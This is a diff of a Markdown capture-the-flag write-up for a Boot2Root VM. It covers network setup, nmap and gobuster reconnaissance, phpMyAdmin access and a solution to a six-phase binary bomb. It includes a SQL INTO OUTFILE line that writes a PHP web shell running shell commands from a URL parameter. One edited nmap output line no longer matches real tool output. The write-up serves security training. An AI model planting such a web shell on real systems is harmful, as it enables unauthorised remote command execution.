@@ -1,14 +1,17 @@
-# Setup
-## Mac ARM
+# Boot2Root - Main Challenge Writeup
+
+## 1. Setup
+
+### 1.1 Mac ARM
 We will need UTM for this demo.
 
-### UTM setup
+#### 1.1.1 UTM setup
 You need to **emulate** the machine since the ISO is x86_64 based and not ARM.
 Then, once you properly configured the boot settings, select your VM on the left panel and click the "Settings" (the right-est icon on the top bar of UTM)(make sure your VM is not running, else you can't edit the settings)
 Under the Network tab, set Network Mode to "Host Only", and in the emulated network card pick "Intel Gigabit Ethernet (e1000)". Save and boot the VM.
 Wait for the VM to fully boot, you should be prompted with the login prompt.
 
-### Finding the IP
+#### 1.1.2 Finding the IP
 After the VM booted, run `ifconfig`.
 ```
 ➜  Boot2Root git:(master) ✗ ifconfig
@@ -45,14 +48,14 @@ You'll get an online host, we'll take IP `192.168.128.2` for the demo.
 
 To make sure that you found the right IP, navigate to `http://192.168.128.2`, you should see the website of the B2R CTF.
 
-## Mac Intel
-### VM Configuration
+### 1.2 Mac Intel
+#### 1.2.1 VM Configuration
 Configure the VM normally. 
 Before booting, go to Your VM > Network > Adapter 1
 Choose Bridged Adapter, pick the interface your connected to (`en0: Wifi` if in WiFi or `eth0` if ethernet)
 Boot the VM
 
-### Finding the VM
+#### 1.2.2 Finding the VM
 Since the VM itself doesn't give its IP away, we need to find it. First, run `ifconfig` to get the status of your network interfaces:
 ```
 ifconfig
@@ -106,7 +109,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.53 seconds
 ```
 This one has, we found the VM
 
-### Accessing the VM in SSH
+#### 1.2.3 Accessing the VM in SSH
 We start [[Nmap]] in attack mode to have a better understanding:
 ```
 ➜  ~ sudo nmap -A 10.80.248.231
@@ -161,7 +164,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
 ```
 
-#### Nmap Analysis
+##### 1.2.3.1 Nmap Analysis
 There are multiple services running:
 - FTP server: port 21
 - SSH server: port 22
@@ -169,7 +172,7 @@ There are multiple services running:
 - IMAP server: port 143
 - SSL/IMAP server: port 993
 
-#### Website analysis
+##### 1.2.3.2 Website analysis
 The website seems somewhat empty. Using [[Gobuster]] with [SecLists](https://github.com/danielmiessler/SecLists)' Common Directory, we get:
 ```
 ➜  wordlists gobuster dir -u http://10.80.248.231 -w SecLists/Discovery/Web-Content/common.txt -t 50
@@ -202,13 +205,13 @@ Finished
 ===============================================================
 ```
 
-## Ubuntu
-### VirtualBox setup
+### 1.3 Ubuntu
+#### 1.3.1 VirtualBox setup
 You will need to create Network Manager (Host-Only Adapter).
 On VirtualBox homepage, do File > Tools > Network Manager (Ctrl + H for short), then click Create.
 Then, setup the VM with the B2R ISO, and go to the Settings of the VM. Click Network > Adapter 1, set "Attached to" to "Host-only Adapter". Make sure that name is the name of the virtual network you created previsouly (likely `vboxnet0`).
 
-### Finding the IP
+#### 1.3.2 Finding the IP
 After the VM booted, run `ifconfig`.
 Search out for the subnetwork you created in the previous step, and look for the `inet` value. We will take IP `192.168.56.1` for the demo.
 Then, run [`nmap`](https://nmap.org/) on the network address (the address of the subnetwork that finishes with a 0), here: `192.168.56.0`.
@@ -217,7 +220,10 @@ You'll get an online host, we'll take IP `192.168.56.101` for the demo.
 
 To make sure that you found the right IP, navigate to `http://192.168.56.101`, you should see the website of the B2R CTF.
 
-# Discovery
+---
+
+## 2. Discovery
+
 If you don't have root permission on the host machine, setup a [Kali Linux](https://www.kali.org/) [Docker](https://www.docker.com/):
 
 ```bash
@@ -260,7 +266,7 @@ PORT    STATE SERVICE    VERSION
 |_Not valid after:  2025-10-05T00:19:46
 993/tcp open  ssl/imaps?
 |_ssl-date: 2025-08-09T17:08:03+00:00; -1s from scanner time.
-| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+|_ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
 | Not valid before: 2015-10-08T20:57:30
 |_Not valid after:  2025-10-07T20:57:30
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
@@ -269,7 +275,7 @@ Host script results:
 |_clock-skew: mean: -1s, deviation: 0s, median: -1s
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 230.38 seconds
+Nmap done: 1 IP address (1 IP address up) scanned in 230.38 seconds
 ```
 
 We idenfity 6 open ports:
@@ -279,8 +285,7 @@ We idenfity 6 open ports:
 - 143: `imap`
 - 993: `ssl/imaps?`
 
-
-## Web server
+### 2.1 Web server
 The website shows a page with no apparent link to any page. Thus we need to bruteforce and try to find some available pages if they exist.
 
 We are going to use [gobuster](https://github.com/OJ/gobuster) with wordlists from [SecListsi](https://github.com/danielmiessler/SecLists):
@@ -337,7 +342,7 @@ You can then log into the webmail (`/webmail`), and access the email `DB Access`
 Then, connect to the `/phpmyadmin` with these credentials.
 
 With SELECT, we can create a new PHP page that would take an input as argument and show us the result, effectively creating a RCE exploit:
-```SQL
+```sql
 SELECT "<?php if (isset($_GET['command'])) {echo '<pre>' . shell_exec($_GET['command']) . '</pre>';}?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"
 ```
 
@@ -395,58 +400,59 @@ o
 NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
 Let's reverse the binary to get the password more easily. 
-1. First password
-The first one is easy and just strcmp on `Public speaking is very easy.` so we just enter it.
 
-2. Second password
-The second password is a math check that multiplies things in weird way in a loop, answer is easy to understand: `1 2 6 24 120 720`
+#### 2.1.1 Bomb Defusal
+1. **First password**
+   The first one is easy and just strcmp on `Public speaking is very easy.` so we just enter it.
 
-3. Third password
-Third one gets an int, a char and another int at the end then enters a switch statement.
-By looking at the code, we see that the right combination is: `0 q 777`
+2. **Second password**
+   The second password is a math check that multiplies things in weird way in a loop, answer is easy to understand: `1 2 6 24 120 720`
 
+3. **Third password**
+   Third one gets an int, a char and another int at the end then enters a switch statement.
+   By looking at the code, we see that the right combination is: `0 q 777`
 
-4. Fourth password
-Fourth one gets an int, passes it through a Fibonacci sequence and compares the result to 55 so we need to input the index of 55 in the Fibonacci sequence, it being `9`.
+4. **Fourth password**
+   Fourth one gets an int, passes it through a Fibonacci sequence and compares the result to 55 so we need to input the index of 55 in the Fibonacci sequence, it being `9`.
 
-5. Fifth password
-Fifth phase is encrypting the string we give it and compares the output with "giants", we simply reverse it and check which characters we have to input to get the right output with a Python script (`script/phase_5.py`): `opekmq`
+5. **Fifth password**
+   Fifth phase is encrypting the string we give it and compares the output with "giants", we simply reverse it and check which characters we have to input to get the right output with a Python script (`script/phase_5.py`): `opekmq`
 
-6. Sixth password
-The sixth phase is more complex. We can figure out it is doing stuff with a 6 element linked list that is loaded in memory.
-With gdb, we try to find what is the content of the linked list and we get :
+6. **Sixth password**
+   The sixth phase is more complex. We can figure out it is doing stuff with a 6 element linked list that is loaded in memory.
+   With gdb, we try to find what is the content of the linked list and we get :
 
-0x804b26c <node1>:      0x000000fd      0x00000001      0x0804b260
+   0x804b26c <node1>:      0x000000fd      0x00000001      0x0804b260
 
-0x804b260 <node2>:      0x000002d5      0x00000002      0x0804b254
+   0x804b260 <node2>:      0x000002d5      0x00000002      0x0804b254
 
-0x804b254 <node3>:      0x0000012d      0x00000003      0x0804b248
+   0x804b254 <node3>:      0x0000012d      0x00000003      0x0804b248
 
-0x804b248 <node4>:      0x000003e5      0x00000004      0x0804b23c
+   0x804b248 <node4>:      0x000003e5      0x00000004      0x0804b23c
 
-0x804b23c <node5>:      0x000000d4      0x00000005      0x0804b230
+   0x804b23c <node5>:      0x000000d4      0x00000005      0x0804b230
 
-0x804b230 <node6>:      0x000001b0      0x00000006      0x00000000
+   0x804b230 <node6>:      0x000001b0      0x00000006      0x00000000
 
-it seems like the linked list contains 3 items: data, index and next
+   it seems like the linked list contains 3 items: data, index and next
 
-After being converted to ints, the linked list looks like:
+   After being converted to ints, the linked list looks like:
 
-`253` -> `725` -> `301` -> `997` -> `212` -> `432`
+   `253` -> `725` -> `301` -> `997` -> `212` -> `432`
 
-The phase waits for 6 int inputs and first checks that there is no duplicates and that all numbers are between 1 and 6. The code sorts out the linked list based on the arguments you arguments you give it. Each argument represents a node to place at position n, n being the index of the argument. 
-For example, if the original list of values is:
-`253` -> `725` -> `301` -> `997` -> `212` -> `432`
+   The phase waits for 6 int inputs and first checks that there is no duplicates and that all numbers are between 1 and 6. The code sorts out the linked list based on the arguments you arguments you give it. Each argument represents a node to place at position n, n being the index of the argument. 
+   For example, if the original list of values is:
+   `253` -> `725` -> `301` -> `997` -> `212` -> `432`
 
-Then, `6 5 4 3 2 1` will give:
+   Then, `6 5 4 3 2 1` will give:
 
-`432` -> `212` -> `997` -> `725` -> `253`
+   `432` -> `212` -> `997` -> `725` -> `253`
 
-So we need to find the right order in which to place the node elements. After investigation, we understand that the program wants to have the nodes sorted in reverse order. 
+   So we need to find the right order in which to place the node elements. After investigation, we understand that the program wants to have the nodes sorted in reverse order. 
 
-So we need to take the highest to lowest indexes:
+   So we need to take the highest to lowest indexes:
 
-`4 2 6 3 1 5`
+   `4 2 6 3 1 5`
 
 Now we have:
 ```
